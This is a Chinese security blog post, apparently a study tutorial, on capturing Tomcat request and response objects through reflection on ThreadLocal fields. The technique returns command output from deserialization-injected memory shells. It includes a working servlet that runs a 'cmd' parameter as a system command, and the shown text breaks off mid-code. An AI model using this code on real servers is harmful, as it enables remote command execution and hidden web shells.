<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="java回显技术所谓回显，其实就是获取命令执行的结果，这种技术常用于目标机器不出网，无法反弹shell的情况。对于Java的中间件来讲，其关键就是获取request和response对象。 通过JSP文件来注入的内存马，由于JSP中内置了一些关键对象，所以我们能够很容易地获得Request和Response对象，并能通过他们来获取目标JVM的上下文Context。那如果我们要通过反序列化漏洞来注入">
<meta property="og:type" content="article">
<meta property="og:title" content="java回显技术">
<meta property="og:url" content="http://example.com/2024/07/30/java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/index.html">
<meta property="og:site_name" content="cmisl_破站">
<meta property="og:description" content="java回显技术所谓回显，其实就是获取命令执行的结果，这种技术常用于目标机器不出网，无法反弹shell的情况。对于Java的中间件来讲，其关键就是获取request和response对象。 通过JSP文件来注入的内存马，由于JSP中内置了一些关键对象，所以我们能够很容易地获得Request和Response对象，并能通过他们来获取目标JVM的上下文Context。那如果我们要通过反序列化漏洞来注入">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/images/image-20240730174520346.png">
<meta property="og:image" content="http://example.com/images/image-20240730174659073.png">
<meta property="og:image" content="http://example.com/images/image-20240730181001035.png">
<meta property="og:image" content="http://example.com/images/image-20240730182034569.png">
<meta property="og:image" content="http://example.com/images/image-20240731001151097.png">
<meta property="og:image" content="http://example.com/images/image-20240731001918781.png">
<meta property="og:image" content="http://example.com/images/image-20240731005138154.png">
<meta property="og:image" content="http://example.com/images/image-20240731011119226.png">
<meta property="og:image" content="http://example.com/images/image-20240731013248652.png">
<meta property="og:image" content="http://example.com/images/image-20240731013616522.png">
<meta property="og:image" content="http://example.com/images/image-20240731013844294.png">
<meta property="og:image" content="http://example.com/images/image-20240731015933265.png">
<meta property="og:image" content="http://example.com/images/image-20240731022101343.png">
<meta property="og:image" content="http://example.com/images/image-20240731022626488.png">
<meta property="og:image" content="http://example.com/images/image-20240731043802388.png">
<meta property="article:published_time" content="2024-07-29T16:00:00.000Z">
<meta property="article:modified_time" content="2024-08-25T19:27:17.106Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/image-20240730174520346.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>java回显技术</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2024/07/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2024/07/23/JAVA%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/07/30/java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/07/30/java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/&text=java回显技术"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/07/30/java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/&title=java回显技术"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/07/30/java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/&is_video=false&description=java回显技术"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=java回显技术&body=Check out this article: http://example.com/2024/07/30/java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/07/30/java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/&title=java回显技术"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/07/30/java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/&title=java回显技术"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/07/30/java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/&title=java回显技术"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/07/30/java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/&title=java回显技术"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/07/30/java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/&name=java回显技术&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/07/30/java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/&t=java回显技术"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF"><span class="toc-number">1.</span> <span class="toc-text">java回显技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ThreadLocal-Response%E5%9B%9E%E6%98%BE"><span class="toc-number">1.1.</span> <span class="toc-text">ThreadLocal Response回显</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.1.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99Demo"><span class="toc-number">1.1.2.</span> <span class="toc-text">编写Demo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.3.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9E%E6%98%BE%E6%8A%A5%E9%94%99%EF%BC%88getWriter%E9%87%8D%E5%A4%8D%E4%BD%BF%E7%94%A8%E6%8A%A5%E9%94%99%EF%BC%89"><span class="toc-number">1.1.4.</span> <span class="toc-text">回显报错（getWriter重复使用报错）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B1%80%E9%99%90%E6%80%A7"><span class="toc-number">1.1.5.</span> <span class="toc-text">局限性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%85%A8%E5%B1%80%E5%AD%98%E5%82%A8Response%E5%9B%9E%E6%98%BE"><span class="toc-number">1.2.</span> <span class="toc-text">通过全局存储Response回显</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96StandardService"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">如何获取StandardService</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat%E7%89%88%E6%9C%AC%E9%97%AE%E9%A2%98"><span class="toc-number">1.2.3.</span> <span class="toc-text">Tomcat版本问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87Acceptor%E8%8E%B7%E5%8F%96NioEndpoint"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">通过Acceptor获取NioEndpoint</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87poller%E8%8E%B7%E5%8F%96NioEndpoint"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">通过poller获取NioEndpoint</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E7%89%88"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">通用版</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ref"><span class="toc-number">1.3.</span> <span class="toc-text">Ref</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        java回显技术
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">cmisl</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-07-29T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-07-30</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="java回显技术"><a href="#java回显技术" class="headerlink" title="java回显技术"></a>java回显技术</h1><p>所谓回显，其实就是获取命令执行的结果，这种技术常用于目标机器不出网，无法反弹shell的情况。对于Java的中间件来讲，其关键就是获取request和response对象。</p>
<p>通过JSP文件来注入的内存马，由于JSP中内置了一些关键对象，所以我们能够很容易地获得Request和Response对象，并能通过他们来获取目标JVM的上下文Context。那如果我们要通过反序列化漏洞来注入内存马，又如何获取到目标JVM的request和response对象呢？</p>
<h2 id="ThreadLocal-Response回显"><a href="#ThreadLocal-Response回显" class="headerlink" title="ThreadLocal Response回显"></a>ThreadLocal Response回显</h2><p>Kingkk 师傅提出的 “Tomcat中一种半通用回显方法”。原文链接：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7348?time__1311=n4+xnD0Dy7=Yq0KitD/iW+RgDu01Kt3DB7WrYD">Tomcat中一种半通用回显方法 - 先知社区 (aliyun.com)</a></p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先，我们应该关注的是，所需的 request 对象必须是与当前线程的 ThreadLocal 相关，而不是一个全局的变量。这样才能确保我们能够获取当前线程的信息。最终，在 <code>org.apache.catalina.core.ApplicationFilterChain</code> 类中，我们会发现两个静态属性：<code>lastServicedRequest</code> 和 <code>lastServicedResponse</code>。由于是静态变量，因此，访问这些属性时，无需创建实例。</p>
<p><img src="/./images/image-20240730174520346.png" alt="image-20240730174520346"></p>
<p>在<code>ApplicationFilterChain#internalDoFilter</code>中，Tomcat会有一段将request对象和response对象存储到这两个变量中的操作。</p>
<p><img src="/./images/image-20240730174659073.png" alt="image-20240730174659073"></p>
<p>Tomcat在处理我们的Servlet以及SpringBoot处理Controller逻辑之前，都会来到<code>ApplicationFilterChain#internalDoFilter</code>中，只要我们让 <code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>的值为true，就可以将request和response存储到这两个变量中。</p>
<p>虽然此时的<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>为<code>false</code>，但是我们后续可以通过反射修改。</p>
<p>可以总结思路如下</p>
<ol>
<li>反射修改<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>的值，通过<code>ThreadLocal#set</code>方法将request和response对象存储到变量中</li>
<li>初始化<code>lastServicedRequest</code>和<code>lastServicedResponse</code>两个变量，默认为null</li>
<li>通过<code>ThreadLocal#get</code>方法将request和response对象从*<code>lastServicedRequest</code><em>和</em><code>lastServicedResponse</code>*中取出</li>
</ol>
<h3 id="编写Demo"><a href="#编写Demo" class="headerlink" title="编写Demo"></a>编写Demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cmisl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/echo&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Tomcat_Echo</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//反射获取所需属性</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//使用modifiersField反射修改final型变量</span></span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedRequestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedResponseField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//将变量WRAP_SAME_OBJECT_FIELD设置为true，并初始化lastServicedRequest和lastServicedResponse变量</span></span><br><span class="line">            <span class="keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="literal">null</span>)) &#123;</span><br><span class="line">                WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (lastServicedRequestField.get(<span class="literal">null</span>) == <span class="literal">null</span>) &#123;</span><br><span class="line">                lastServicedRequestField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (lastServicedResponseField.get(<span class="literal">null</span>) == <span class="literal">null</span>) &#123;</span><br><span class="line">                lastServicedResponseField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取request变量</span></span><br><span class="line">            <span class="keyword">if</span> (lastServicedRequestField.get(<span class="literal">null</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">ThreadLocal</span> <span class="variable">threadLocal</span> <span class="operator">=</span> (ThreadLocal) lastServicedRequestField.get(<span class="literal">null</span>);</span><br><span class="line">                <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> (ServletRequest) threadLocal.get();</span><br><span class="line">                System.out.println(servletRequest);</span><br><span class="line">                System.out.println((HttpServletRequest) servletRequest == req);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们这里断点需要在第二次请求的时候断下来。因为第一次<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>为false，无法进入<code>ThreadLocal#set</code>方法将request和response对象存储到变量中。所以需要第一次请求反射将判断修改为true。第二次才能从<code>ThreadLocal</code>中获取request和response。</p>
<p><img src="/./images/image-20240730181001035.png"></p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cmisl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.Servlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/exec&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Tomcat_Exec</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//反射获取所需属性</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//使用modifiersField反射修改final型变量</span></span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedRequestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedResponseField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//将变量WRAP_SAME_OBJECT_FIELD设置为true，并初始化lastServicedRequest和lastServicedResponse变量</span></span><br><span class="line">            <span class="keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="literal">null</span>)) &#123;</span><br><span class="line">                WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (lastServicedRequestField.get(<span class="literal">null</span>) == <span class="literal">null</span>) &#123;</span><br><span class="line">                lastServicedRequestField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (lastServicedResponseField.get(<span class="literal">null</span>) == <span class="literal">null</span>) &#123;</span><br><span class="line">                lastServicedResponseField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ServletRequest servletRequest=<span class="literal">null</span>;</span><br><span class="line">            ServletResponse servletResponse=<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取reques和responset变量</span></span><br><span class="line">            <span class="keyword">if</span> (lastServicedRequestField.get(<span class="literal">null</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">ThreadLocal</span> <span class="variable">threadLocal</span> <span class="operator">=</span> (ThreadLocal) lastServicedRequestField.get(<span class="literal">null</span>);</span><br><span class="line">                servletRequest = (ServletRequest) threadLocal.get();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取request变量</span></span><br><span class="line">            <span class="keyword">if</span> (lastServicedResponseField.get(<span class="literal">null</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">ThreadLocal</span> <span class="variable">threadLocal</span> <span class="operator">=</span> (ThreadLocal) lastServicedResponseField.get(<span class="literal">null</span>);</span><br><span class="line">                servletResponse = (ServletResponse) threadLocal.get();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            servletResponse.setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(cmd!=<span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 判断操作系统类型</span></span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> 